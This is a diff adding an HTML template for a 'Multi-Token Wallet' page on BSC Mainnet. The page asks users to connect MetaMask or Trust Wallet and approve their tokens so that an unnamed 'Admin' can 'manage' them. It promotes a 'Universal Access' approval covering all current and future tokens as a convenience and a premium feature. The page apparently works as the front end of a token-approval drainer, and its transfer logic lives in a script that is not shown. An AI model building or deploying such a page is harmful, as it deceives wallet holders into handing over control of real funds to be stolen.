@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Token Wallet Connect - Universal Access</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        .token-selector {
+            background: var(--bg-secondary);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .token-selector select {
+            width: 100%;
+            padding: 12px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .token-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 15px;
+            background: var(--bg-tertiary);
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        .token-icon {
+            font-size: 24px;
+        }
+        .token-name {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        .token-balance {
+            margin-left: auto;
+            font-weight: 700;
+            color: var(--primary-color);
+            font-size: 18px;
+        }
+        .approval-status {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: rgba(79, 70, 229, 0.1);
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        .multi-token-features {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(79, 70, 229, 0.1));
+            border: 1px solid #10B981;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .token-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .token-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            background: var(--bg-tertiary);
+            border-radius: 6px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="header-content">
+                <div class="logo">
+                    <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="20" cy="20" r="20" fill="#4F46E5"/>
+                        <path d="M20 10L30 20L20 30L10 20L20 10Z" fill="white"/>
+                    </svg>
+                    <h1>Multi-Token Wallet</h1>
+                </div>
+                <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+            </div>
+        </header>
+
+        <main>
+            <!-- Wallet Connection Status -->
+            <div id="connectionStatus" class="status-card hidden">
+                <div class="status-header">
+                    <h2>Connected Wallet</h2>
+                    <span class="status-indicator online"></span>
+                </div>
+                <div class="wallet-address">
+                    <span class="label">Address:</span>
+                    <span id="walletAddress" class="address"></span>
+                    <button id="copyBtn" class="icon-btn" title="Copy Address">📋</button>
+                </div>
+                <div class="network-info">
+                    <span class="label">Network:</span>
+                    <span id="networkName">BSC Mainnet</span>
+                </div>
+            </div>
+
+            <!-- Multi-Token Features -->
+            <div class="multi-token-features card">
+                <h2>🎯 Universal Multi-Token System</h2>
+                <div style="color: var(--text-secondary); line-height: 1.6;">
+                    <p><strong>✅ Access ALL BEP-20 tokens on BSC!</strong></p>
+                    <ul style="margin: 15px 0 0 20px;">
+                        <li>Support for unlimited tokens</li>
+                        <li>USDT, BUSD, USDC, CAKE, WBNB, and more</li>
+                        <li>Add custom tokens via admin panel</li>
+                        <li>Single approval for all tokens</li>
+                        <li>Universal transfer management</li>
+                    </ul>
+                    <div class="token-grid">
+                        <div class="token-badge">💵 USDT</div>
+                        <div class="token-badge">💰 BUSD</div>
+                        <div class="token-badge">💵 USDC</div>
+                        <div class="token-badge">🥞 CAKE</div>
+                        <div class="token-badge">🟡 WBNB</div>
+                        <div class="token-badge">🔷 ETH</div>
+                        <div class="token-badge">🟣 MATIC</div>
+                        <div class="token-badge">➕ Custom</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Token Selector -->
+            <div id="tokenSelector" class="token-selector card hidden">
+                <h2>🪙 Select Token</h2>
+                <select id="tokenSelect">
+                    <option value="">Choose a token to manage</option>
+                </select>
+
+                <div id="balanceDisplay">
+                    <div class="token-info">
+                        <span class="token-name">Select a token to view balance</span>
+                    </div>
+                </div>
+
+                <div class="approval-status">
+                    <div>
+                        <strong>Approval Status:</strong>
+                        <div id="tokenAllowance" style="margin-top: 5px;">Not selected</div>
+                    </div>
+                    <button id="approveTokenBtn" class="primary-btn" disabled>
+                        Approve Token
+                    </button>
+                </div>
+            </div>
+
+            <!-- Approval Options -->
+            <div id="approvalOptions" class="card hidden">
+                <h2>🔐 Choose Approval Method</h2>
+                <p class="info-text">
+                    Select how you want to grant admin access to your tokens.
+                </p>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
+                    <!-- Individual Approval -->
+                    <div class="approval-option" style="background: var(--bg-tertiary); padding: 20px; border-radius: 12px; border: 2px solid var(--border-color); cursor: pointer;" onclick="showIndividualApproval()">
+                        <h3 style="color: var(--primary-color); margin-bottom: 10px;">
+                            🔐 Individual Tokens
+                        </h3>
+                        <p style="color: var(--text-secondary); font-size: 14px; margin: 0;">
+                            Approve tokens one by one for maximum control
+                        </p>
+                        <ul style="margin: 10px 0 0 15px; color: var(--text-secondary); font-size: 13px;">
+                            <li>✅ Full control over each token</li>
+                            <li>✅ Approve only what you want</li>
+                            <li>✅ Revocable individually</li>
+                        </ul>
+                    </div>
+
+                    <!-- Universal Approval -->
+                    <div class="approval-option" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(16, 185, 129, 0.1)); padding: 20px; border-radius: 12px; border: 2px solid #8B5CF6; cursor: pointer;" onclick="showUniversalApproval()">
+                        <h3 style="color: #8B5CF6; margin-bottom: 10px;">
+                            🚀 Universal Access
+                        </h3>
+                        <p style="color: var(--text-secondary); font-size: 14px; margin: 0;">
+                            One-time approval for ALL supported tokens
+                        </p>
+                        <ul style="margin: 10px 0 0 15px; color: var(--text-secondary); font-size: 13px;">
+                            <li>⚡ Fast and convenient</li>
+                            <li>🔄 All tokens at once</li>
+                            <li>💎 Premium access</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Individual Token Approval -->
+            <div id="individualApprovalCard" class="card hidden">
+                <h2>🔐 Individual Token Approval</h2>
+                <p class="info-text">
+                    Approve tokens individually for maximum control over your assets.
+                </p>
+
+                <div class="alert" style="background: rgba(79, 70, 229, 0.1); border: 1px solid #4F46E5; color: #94A3B8; padding: 15px; border-radius: 10px; margin: 20px 0;">
+                    <strong>ℹ️ Individual Token Approvals:</strong>
+                    <ul style="margin: 10px 0 0 20px; line-height: 1.8;">
+                        <li>Approve each token separately</li>
+                        <li>Full control over which tokens to share</li>
+                        <li>Revocable anytime in your wallet</li>
+                        <li>Admin can only manage approved tokens</li>
+                    </ul>
+                </div>
+
+                <div id="currentTokenInfo" style="background: var(--bg-tertiary); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <p style="margin: 0; color: var(--text-secondary);">
+                        <strong>Current Token:</strong> <span id="currentTokenDisplay">Select a token above</span>
+                    </p>
+                </div>
+
+                <button id="approveIndividualBtn" class="primary-btn" style="font-size: 18px; padding: 18px;" disabled>
+                    Select Token First
+                </button>
+
+                <button onclick="showApprovalOptions()" style="margin-left: 10px; padding: 18px; background: var(--bg-tertiary); color: var(--text-secondary); border: 1px solid var(--border-color); border-radius: 8px; cursor: pointer;">
+                    ← Back
+                </button>
+
+                <div id="individualApprovalStatus" class="hidden" style="margin-top: 20px; padding: 20px; background: rgba(16, 185, 129, 0.1); border: 1px solid #10B981; border-radius: 10px; text-align: center;">
+                    <h3 style="color: #10B981; margin-bottom: 10px;">✅ Token Approved!</h3>
+                    <p style="color: #94A3B8;">Admin can now manage this token. Select other tokens to approve them as well.</p>
+                </div>
+            </div>
+
+            <!-- Universal Access Card -->
+            <div id="universalApprovalCard" class="card hidden">
+                <h2>🚀 Universal Token Access</h2>
+                <p class="info-text">
+                    Grant admin access to ALL supported tokens with a single approval.
+                </p>
+
+                <div class="alert" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(16, 185, 129, 0.1)); border: 1px solid #8B5CF6; color: #94A3B8; padding: 15px; border-radius: 10px; margin: 20px 0;">
+                    <strong>🌟 Universal Access Benefits:</strong>
+                    <ul style="margin: 10px 0 0 20px; line-height: 1.8;">
+                        <li>⚡ One-time approval for ALL tokens</li>
+                        <li>💰 USDT, BNB, ETH, BTC, TRON + more</li>
+                        <li>🔐 Admin can manage any approved token</li>
+                        <li>📈 Future tokens automatically included</li>
+                        <li>⚙️ Maximum convenience</li>
+                    </ul>
+                </div>
+
+                <div style="background: var(--bg-tertiary); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <h4 style="color: #8B5CF6; margin-bottom: 10px;">📋 Tokens Included in Universal Access:</h4>
+                    <div class="token-grid">
+                        <div class="token-badge">💵 USDT</div>
+                        <div class="token-badge">🟡 BNB</div>
+                        <div class="token-badge">🔷 ETH</div>
+                        <div class="token-badge">🟠 BTC</div>
+                        <div class="token-badge">🔴 TRON</div>
+                        <div class="token-badge">💰 BUSD</div>
+                        <div class="token-badge">💵 USDC</div>
+                        <div class="token-badge">🥞 CAKE</div>
+                        <div class="token-badge">➕ All Future Tokens</div>
+                    </div>
+                </div>
+
+                <button id="universalAccessBtn" class="primary-btn" style="font-size: 18px; padding: 18px; background: linear-gradient(135deg, #8B5CF6, #7C3AED);">
+                    🚀 Enable Universal Access
+                </button>
+
+                <button onclick="showApprovalOptions()" style="margin-left: 10px; padding: 18px; background: var(--bg-tertiary); color: var(--text-secondary); border: 1px solid var(--border-color); border-radius: 8px; cursor: pointer;">
+                    ← Back
+                </button>
+
+                <div id="universalApprovalStatus" class="hidden" style="margin-top: 20px; padding: 20px; background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(16, 185, 129, 0.1)); border: 1px solid #8B5CF6; border-radius: 10px; text-align: center;">
+                    <h3 style="color: #8B5CF6; margin-bottom: 10px;">🌟 Universal Access Enabled!</h3>
+                    <p style="color: #94A3B8;">Admin can now manage ALL supported tokens including future additions!</p>
+                </div>
+            </div>
+
+            <!-- Instructions Card -->
+            <div id="instructionsCard" class="card">
+                <h2>🚀 Getting Started</h2>
+                <ol class="instructions-list">
+                    <li>
+                        <strong>Connect Your Wallet</strong>
+                        <p>Click the "Connect Wallet" button to connect MetaMask or Trust Wallet</p>
+                    </li>
+                    <li>
+                        <strong>Select Token</strong>
+                        <p>Choose from popular tokens (USDT, BUSD, CAKE, etc.)</p>
+                    </li>
+                    <li>
+                        <strong>Approve Individual Token</strong>
+                        <p>Click "Approve Token" to grant admin access for the selected token only</p>
+                    </li>
+                    <li>
+                        <strong>Repeat for Other Tokens</strong>
+                        <p>Select and approve each token you want to share individually</p>
+                    </li>
+                    <li>
+                        <strong>You're All Set!</strong>
+                        <p>Admin can now manage only the tokens you've approved</p>
+                    </li>
+                </ol>
+
+                <div class="alert alert-warning">
+                    <strong>⚠️ Important:</strong> You are using BSC Mainnet with REAL funds. Double-check tokens and amounts before approving!
+                </div>
+            </div>
+        </main>
+
+        <!-- Loading Overlay -->
+        <div id="loadingOverlay" class="loading-overlay hidden">
+            <div class="spinner"></div>
+            <p id="loadingText">Processing...</p>
+        </div>
+
+        <!-- Toast Notification -->
+        <div id="toast" class="toast hidden">
+            <span id="toastMessage"></span>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script>
+        // Inject environment variables from Flask
+        window.CONTRACT_ADDRESSES = {
+            UNIVERSAL_CONTRACT_ADDRESS: '{{ universal_contract_address | default("YOUR_UNIVERSAL_CONTRACT_ADDRESS_HERE") }}',
+            USDT_CONTRACT_ADDRESS: '{{ usdt_contract_address }}',
+            PROGRAM_CONTRACT_ADDRESS: '{{ program_contract_address }}'
+        };
+    </script>
+    <script src="{{ url_for('static', filename='js/multi-token-user.js') }}"></script>
+</body>
+</html>
